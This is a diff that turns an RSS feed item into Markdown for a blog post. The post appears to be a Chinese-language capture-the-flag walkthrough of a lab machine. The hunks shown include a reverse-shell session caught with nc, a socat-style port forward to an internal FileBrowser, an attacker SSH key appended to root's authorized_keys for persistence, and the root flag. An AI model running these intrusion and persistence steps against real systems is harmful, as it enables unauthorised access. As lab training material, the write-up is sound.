@@ -1,5 +1,4 @@
-<?xml version='1.0' encoding='UTF-8'?>
-<rss xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/" version="2.0"><channel><title>MJ</title><link>https://faabbi.github.io</link><description>Welcome</description><copyright>MJ</copyright><docs>http://www.rssboard.org/rss-specification</docs><generator>python-feedgen</generator><image><url>https://avatars.githubusercontent.com/u/99706997?v=4</url><title>avatar</title><link>https://faabbi.github.io</link></image><lastBuildDate>Mon, 10 Nov 2025 09:28:05 +0000</lastBuildDate><managingEditor>MJ</managingEditor><ttl>60</ttl><webMaster>MJ</webMaster><item><title>link-MJ</title><link>https://faabbi.github.io/post/link-MJ.html</link><description>## 1.信息收集
+## 1.信息收集
 ```
 ┌──(root㉿kali)-[/tmp/test]
 └─# nmap -sn 192.168.2.0/24               
@@ -49,7 +48,7 @@ PORT   STATE SERVICE VERSION
 |   256 bb:e8:a2:31:d4:05:a9:c9:31:ff:62:f6:32:84:21:9d (ECDSA)
 |_  256 3b:ae:34:64:4f:a5:75:b9:4a:b9:81:f9:89:76:99:eb (ED25519)
 80/tcp open  http    Apache httpd 2.4.62 ((Debian))
-|_http-title: RedBean&amp;#039;s Blog
+|_http-title: RedBean&#039;s Blog
 |_http-server-header: Apache/2.4.62 (Debian)
 |_http-generator: WordPress 6.7
 | http-git: 
@@ -105,7 +104,7 @@ connect to [192.168.2.14] from (UNKNOWN) [192.168.2.14] 41966
 bash: cannot set terminal process group (414): Inappropriate ioctl for device
 bash: no job control in this shell
 www-data@link:/var/www/html/wp-content/plugins/akismet$ /usr/bin/script -qc /bin/bash
-&lt;tent/plugins/akismet$ /usr/bin/script -qc /bin/bash    
+<tent/plugins/akismet$ /usr/bin/script -qc /bin/bash    
 www-data@link:/var/www/html/wp-content/plugins/akismet$ ^Z
 zsh: suspended  nc -lvvp 2332
                                                                                                          
@@ -136,7 +135,7 @@ LISTEN     0          128                        *:80                       *:*
 
 socket转发出去
 ```
-www-data@link:/$ socket TCP-LISTEN:9999,fork TCP:127.0.0.1:8080 &amp;
+www-data@link:/$ socket TCP-LISTEN:9999,fork TCP:127.0.0.1:8080 &
 ```
 
 访问发现是fileBrower
@@ -246,7 +245,7 @@ root@48c9bad9b420:/#
 
 
 ```
-root@48c9bad9b420:~/.ssh# echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQClUpaEKHlyG1yCMmNTl3nbj+ZzfgpxcvmHWEAV0CMmFZ+mJ/1m5hRfeJ/waaLTE+Ov+woDZaRHfXPESP3W+3QsQj+AMeVFLQ+eQv0W+PhCIWBI18jtJhImEvC6xWM5XNY9tG/4moICziMJ6b81hYevmvEGVI8RKR5IK6ikXHmPXvRZxJmaRltDIFXDQgdgLHHEjXbQ0DAeSRjCeSk+9gKHIX+KQ8qcDX+Y1z15A/PgMzQ0QvxP7Yoezfqr4ZwYI3ohpuOaeGXq/9D5Sh1LU7l7uG7BnZWaTRfptcbWFIohEzVXcW2+C+h8LuSgWxQPT+t6tZ7kfKYk6Cm4XgTXLZLMxOdoG40x4JNk11xkMEr4RYZoIArlPP3y3nL1hvB6lgcVzyH0Yrd2QBUzJmZ2ar9IdRJZf0ZclmJ/VOy527Bm6bksiKDzhBZOgD1xYL/2MkiYDS01li3FHIh1ku17tnXWi64RDE2eGOvQFeL8XC53YZ9rlsVSJ7SOs05mDT1DPpwTMYP2S9Aw+HTNlwJayaRkXd28PS22YSiUyxkbYu83aHCibCfQhpfIz9FrVVJjg2Rri/vETOBNARuLzZci7UkNe4LExUUdTw6UsaAF9G9+Ku/qIq7CRuFuqURsT7j/MYVv1/5ylobcYfk+2wqW0isiawr7qrF5q0NRq/+abarB6Q== root@192.168.2.15' &gt;&gt; authorized_keys
+root@48c9bad9b420:~/.ssh# echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQClUpaEKHlyG1yCMmNTl3nbj+ZzfgpxcvmHWEAV0CMmFZ+mJ/1m5hRfeJ/waaLTE+Ov+woDZaRHfXPESP3W+3QsQj+AMeVFLQ+eQv0W+PhCIWBI18jtJhImEvC6xWM5XNY9tG/4moICziMJ6b81hYevmvEGVI8RKR5IK6ikXHmPXvRZxJmaRltDIFXDQgdgLHHEjXbQ0DAeSRjCeSk+9gKHIX+KQ8qcDX+Y1z15A/PgMzQ0QvxP7Yoezfqr4ZwYI3ohpuOaeGXq/9D5Sh1LU7l7uG7BnZWaTRfptcbWFIohEzVXcW2+C+h8LuSgWxQPT+t6tZ7kfKYk6Cm4XgTXLZLMxOdoG40x4JNk11xkMEr4RYZoIArlPP3y3nL1hvB6lgcVzyH0Yrd2QBUzJmZ2ar9IdRJZf0ZclmJ/VOy527Bm6bksiKDzhBZOgD1xYL/2MkiYDS01li3FHIh1ku17tnXWi64RDE2eGOvQFeL8XC53YZ9rlsVSJ7SOs05mDT1DPpwTMYP2S9Aw+HTNlwJayaRkXd28PS22YSiUyxkbYu83aHCibCfQhpfIz9FrVVJjg2Rri/vETOBNARuLzZci7UkNe4LExUUdTw6UsaAF9G9+Ku/qIq7CRuFuqURsT7j/MYVv1/5ylobcYfk+2wqW0isiawr7qrF5q0NRq/+abarB6Q== root@192.168.2.15" >> authorized_keys
 root@48c9bad9b420:~/.ssh# ls
 authorized_keys
 ```
@@ -267,4 +266,3 @@ Last login: Wed Oct 29 01:17:44 2025 from 192.168.56.1
 root@link:~# cat root.txt
 flag{e6a6e8eac98579c8d826d07df3c132bc}
 ```
-。</description><guid isPermaLink="true">https://faabbi.github.io/post/link-MJ.html</guid><pubDate>Mon, 10 Nov 2025 09:27:35 +0000</pubDate></item><item><title>Test</title><link>https://faabbi.github.io/post/Test.html</link><description>test。</description><guid isPermaLink="true">https://faabbi.github.io/post/Test.html</guid><pubDate>Mon, 10 Nov 2025 09:03:45 +0000</pubDate></item></channel></rss>
